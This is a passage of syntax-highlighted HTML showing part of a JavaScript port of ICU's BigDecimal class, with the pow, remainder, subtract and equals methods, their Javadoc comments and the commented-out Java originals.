&lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the operation (the power).</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this**rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is out of range or</span></span><br><span class="line"><span class="comment">  *             is not a whole number.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal pow(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.pow(rhs,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"> <span class="comment">// The name for this method is inherited from the precedent set by the</span></span><br><span class="line"> <span class="comment">// BigInteger and Math classes.</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this**rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the power (&lt;b&gt;&lt;code&gt;**&lt;/code&gt;&lt;/b&gt;) operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The first parameter is the power to which the &lt;code&gt;this&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * will be raised; it must be in the range -999999999 through</span></span><br><span class="line"><span class="comment">  * 999999999, and must have a decimal part of zero.  Note that these</span></span><br><span class="line"><span class="comment">  * restrictions may be removed in the future, so they should not be</span></span><br><span class="line"><span class="comment">  * used as a test for a whole number.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;digits&lt;/code&gt; setting of the &lt;code&gt;MathContext&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * parameter is 0, the power must be zero or positive.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the operation (the power).</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this**rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is out of range or</span></span><br><span class="line"><span class="comment">  *             is not a whole number.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal pow(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">pow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (pow.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = pow.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (pow.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"pow(): "</span> + pow.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = pow.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">//--int n;</span></span><br><span class="line">  <span class="keyword">var</span> n;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal lhs;</span></span><br><span class="line">  <span class="keyword">var</span> lhs;</span><br><span class="line">  <span class="comment">//--int reqdig;</span></span><br><span class="line">  <span class="keyword">var</span> reqdig;</span><br><span class="line">  <span class="comment">//-- int workdigits=0;</span></span><br><span class="line">  <span class="keyword">var</span> workdigits=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int L=0;</span></span><br><span class="line">  <span class="keyword">var</span> L=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.MathContext workset;</span></span><br><span class="line">  <span class="keyword">var</span> workset;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  <span class="comment">//--boolean seenbit;</span></span><br><span class="line">  <span class="keyword">var</span> seenbit;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(rhs,set.digits);</span><br><span class="line">  n=rhs.intcheck(<span class="keyword">this</span>.MinArg,<span class="keyword">this</span>.MaxArg); <span class="comment">// check RHS by the rules</span></span><br><span class="line">  lhs=<span class="keyword">this</span>; <span class="comment">// clarified name</span></span><br><span class="line"></span><br><span class="line">  reqdig=set.digits; <span class="comment">// local copy (heavily used)</span></span><br><span class="line">  <span class="keyword">if</span> (reqdig==<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span> (rhs.ind==<span class="keyword">this</span>.isneg)</span><br><span class="line">     <span class="comment">//--throw new java.lang.ArithmeticException("Negative power:"+" "+rhs.toString());</span></span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"pow(): Negative power: "</span> + rhs.toString();</span><br><span class="line">    workdigits=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* non-0 digits */</span></span><br><span class="line">    <span class="keyword">if</span> ((rhs.mant.length+rhs.exp)&gt;reqdig)</span><br><span class="line">     <span class="comment">//--throw new java.lang.ArithmeticException("Too many digits:"+" "+rhs.toString());</span></span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"pow(): Too many digits: "</span> + rhs.toString();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Round the lhs to DIGITS if need be */</span></span><br><span class="line">    <span class="keyword">if</span> (lhs.mant.length&gt;reqdig)</span><br><span class="line">     lhs=<span class="keyword">this</span>.clone(lhs).round(set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* L for precision calculation [see ANSI X3.274-1996] */</span></span><br><span class="line">    L=rhs.mant.length+rhs.exp; <span class="comment">// length without decimal zeros/exp</span></span><br><span class="line">    workdigits=(reqdig+L)+<span class="number">1</span>; <span class="comment">// calculate the working DIGITS</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Create a copy of set for working settings */</span></span><br><span class="line">  <span class="comment">// Note: no need to check for lostDigits again.</span></span><br><span class="line">  <span class="comment">// 1999.07.17 Note: this construction must follow RHS check</span></span><br><span class="line">  workset=<span class="keyword">new</span> MathContext(workdigits,set.form,<span class="literal">false</span>,set.roundingMode);</span><br><span class="line"></span><br><span class="line">  res=<span class="keyword">this</span>.ONE; <span class="comment">// accumulator</span></span><br><span class="line">  <span class="keyword">if</span> (n==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> res; <span class="comment">// x**0 == 1</span></span><br><span class="line">  <span class="keyword">if</span> (n&lt;<span class="number">0</span>)</span><br><span class="line">   n=-n; <span class="comment">// [rhs.ind records the sign]</span></span><br><span class="line">  seenbit=<span class="literal">false</span>; <span class="comment">// set once we've seen a 1-bit</span></span><br><span class="line">  &#123;i=<span class="number">1</span>;i:<span class="keyword">for</span>(;;i++)&#123; <span class="comment">// for each bit [top bit ignored]</span></span><br><span class="line">   <span class="comment">//n=n+n; // shift left 1 bit</span></span><br><span class="line">   n&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span> (n&lt;<span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">// top bit is set</span></span><br><span class="line">     seenbit=<span class="literal">true</span>; <span class="comment">// OK, we're off</span></span><br><span class="line">     res=res.multiply(lhs,workset); <span class="comment">// acc=acc*x</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span> (i==<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">break</span> i; <span class="comment">// that was the last bit</span></span><br><span class="line">   <span class="keyword">if</span> ((!seenbit))</span><br><span class="line">    <span class="keyword">continue</span> i; <span class="comment">// we don't have to square 1</span></span><br><span class="line">   res=res.multiply(res,workset); <span class="comment">// acc=acc*acc [square]</span></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*i*/</span> <span class="comment">// 32 bits</span></span><br><span class="line">  <span class="keyword">if</span> (rhs.ind&lt;<span class="number">0</span>)  <span class="comment">// was a **-n [hence digits&gt;0]</span></span><br><span class="line">   res=<span class="keyword">this</span>.ONE.divide(res,workset); <span class="comment">// .. so acc=1/acc</span></span><br><span class="line">  <span class="keyword">return</span> res.finish(set,<span class="literal">true</span>); <span class="comment">// round and strip [original digits]</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * the remainder of &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #remainder(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * This is not the modulo operator -- the result may be negative.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the remainder operation.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the remainder</span></span><br><span class="line"><span class="comment">  *             of &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal remainder(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.dodivide('R',rhs,plainMC,-1);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the remainder of</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this/rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the remainder operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * This is not the modulo operator -- the result may be negative.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the remainder operation.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the remainder</span></span><br><span class="line"><span class="comment">  *             of &lt;code&gt;this+rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if the integer part of the result will</span></span><br><span class="line"><span class="comment">  *             not fit in the number of digits specified for the</span></span><br><span class="line"><span class="comment">  *             context.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal remainder(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">remainder</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (remainder.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = remainder.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (remainder.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"remainder(): "</span> + remainder.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = remainder.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.dodivide(<span class="string">'R'</span>,rhs,set,<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this-rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #subtract(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will be</span></span><br><span class="line"><span class="comment">  * the maximum of the scales of the two operands.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the subtraction.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this-rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal subtract(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.subtract(rhs,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this-rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the subtraction (&lt;b&gt;&lt;code&gt;-&lt;/code&gt;&lt;/b&gt;) operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the subtraction.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this-rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal subtract(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">subtract</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (subtract.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = subtract.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (subtract.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"subtract(): "</span> + subtract.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = subtract.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal newrhs;</span></span><br><span class="line">  <span class="keyword">var</span> newrhs;</span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(rhs,set.digits);</span><br><span class="line">  <span class="comment">// [add will recheck .. but would report -rhs]</span></span><br><span class="line">  <span class="comment">/* carry out the subtraction */</span></span><br><span class="line">  <span class="comment">// we could fastpath -0, but it is too rare.</span></span><br><span class="line">  newrhs=<span class="keyword">this</span>.clone(rhs); <span class="comment">// safe copy</span></span><br><span class="line">  newrhs.ind=-newrhs.ind; <span class="comment">// prepare to subtract</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.add(newrhs,set); <span class="comment">// arithmetic</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"> <span class="comment">/* Other methods                                                    */</span></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;byte&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is</span></span><br><span class="line"><span class="comment">  * out of the possible range for a &lt;code&gt;byte&lt;/code&gt; (8-bit signed</span></span><br><span class="line"><span class="comment">  * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;byte&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero</span></span><br><span class="line"><span class="comment">  *                 decimal part, or will not fit in a &lt;code&gt;byte&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public byte byteValueExact()&#123;</span></span><br><span class="line"> <span class="comment">//-- int num;</span></span><br><span class="line"> <span class="comment">//-- num=this.intValueExact(); // will check decimal part too</span></span><br><span class="line"> <span class="comment">//-- if ((num&gt;127)|(num&lt;(-128)))</span></span><br><span class="line"> <span class="comment">//--  throw new java.lang.ArithmeticException("Conversion overflow:"+" "+this.toString());</span></span><br><span class="line"> <span class="comment">//-- return (byte)num;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; with the value of the parameter.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the parameter is &lt;code&gt;null&lt;/code&gt;, or is not an instance of the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; type, an exception is thrown.</span></span><br><span class="line"><span class="comment">  * Otherwise, the parameter is cast to type &lt;code&gt;BigDecimal&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * and the result of the &#123;@link #compareTo(BigDecimal)&#125; method,</span></span><br><span class="line"><span class="comment">  * using the cast parameter, is returned.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &#123;@link #compareTo(BigDecimal, MathContext)&#125; method should be</span></span><br><span class="line"><span class="comment">  * used when a &lt;code&gt;MathContext&lt;/code&gt; is needed for the comparison.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;Object&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @return     An &lt;code&gt;int&lt;/code&gt; whose value is -1, 0, or 1 as</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this&lt;/code&gt; is numerically less than, equal to,</span></span><br><span class="line"><span class="comment">  *             or greater than &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ClassCastException if &lt;code&gt;rhs&lt;/code&gt; cannot be cast to</span></span><br><span class="line"><span class="comment">  *                 a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  * @see    #compareTo(BigDecimal)</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int compareTo(java.lang.Object rhsobj)&#123;</span></span><br><span class="line"> <span class="comment">//-- // the cast in the next line will raise ClassCastException if necessary</span></span><br><span class="line"> <span class="comment">//-- return compareTo((com.ibm.icu.math.BigDecimal)rhsobj,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;double&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible range for a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;double&lt;/code&gt; (64-bit signed floating point) result then an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The double produced is identical to result of expressing the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; as a &lt;code&gt;String&lt;/code&gt; and then</span></span><br><span class="line"><span class="comment">  * converting it using the &lt;code&gt;Double(String)&lt;/code&gt; constructor;</span></span><br><span class="line"><span class="comment">  * this can result in values of &lt;code&gt;Double.NEGATIVE_INFINITY&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * or &lt;code&gt;Double.POSITIVE_INFINITY&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;double&lt;/code&gt; corresponding to &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public double doubleValue()&#123;</span></span><br><span class="line"> <span class="comment">//-- // We go via a String [as does BigDecimal in JDK 1.2]</span></span><br><span class="line"> <span class="comment">//-- // Next line could possibly raise NumberFormatException</span></span><br><span class="line"> <span class="comment">//-- return java.lang.Double.valueOf(this.toString()).doubleValue();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; with &lt;code&gt;rhs&lt;/code&gt; for</span></span><br><span class="line"><span class="comment">  * equality.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the parameter is &lt;code&gt;null&lt;/code&gt;, or is not an instance of the</span></span><br><span class="line"><span class="comment">  * BigDecimal type, or is not exactly equal to the current</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; object, then &lt;i&gt;false&lt;/i&gt; is returned.</span></span><br><span class="line"><span class="comment">  * Otherwise, &lt;i&gt;true&lt;/i&gt; is returned.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * "Exactly equal", here, means that the &lt;code&gt;String&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * representations of the &lt;code&gt;BigDecimal&lt;/code&gt; numbers are</span></span><br><span class="line"><span class="comment">  * identical (they have the same characters in the same sequence).</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &#123;@link #compareTo(BigDecimal, MathContext)&#125; method should be</span></span><br><span class="line"><span class="comment">  * used for more general comparisons.</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;Object&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;boolean&lt;/code&gt; whose value &lt;i&gt;true&lt;/i&gt; if and</span></span><br><span class="line"><span class="comment">  *             only if the operands have identical string representations.</span></span><br><span class="line"><span class="comment">  * @throws ClassCastException if &lt;code&gt;rhs&lt;/code&gt; cannot be cast to</span></span><br><span class="line"><span class="comment">  *                 a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  * @see    #compareTo(Object)</span></span><br><span class="line"><span class="comment">  * @see    #compareTo(BigDecimal)</span></span><br><span class="line"><span class="comment">  * @see    #compareTo(BigDecimal, MathContext)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public boolean equals(java.lang.Object obj)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">equals</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal rhs;</span></span><br><span class="line">  <span class="keyword">var</span> rhs;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--char lca[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> lca=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--char rca[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> rca=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">// We are equal iff toString of both are exactly the same</span></span><br><span class="line">  <span class="keyword">if</span> (obj==<span class="literal">null</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// not equal</span></span><br><span class="line">  <span class="keyword">if</span> ((!(((obj <span class="keyword">instanceof</span> BigDecimal)))))</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// not a decimal</span></span><br><span class="line">  rhs=obj; <span class="comment">// cast; we know it will work</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.ind!=rhs.ind)</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// different signs never match</span></span><br><span class="line">  <span class="keyword">if</span> (((<span class="keyword">this</span>.mant.length==rhs.mant.length)&amp;&amp;(<span 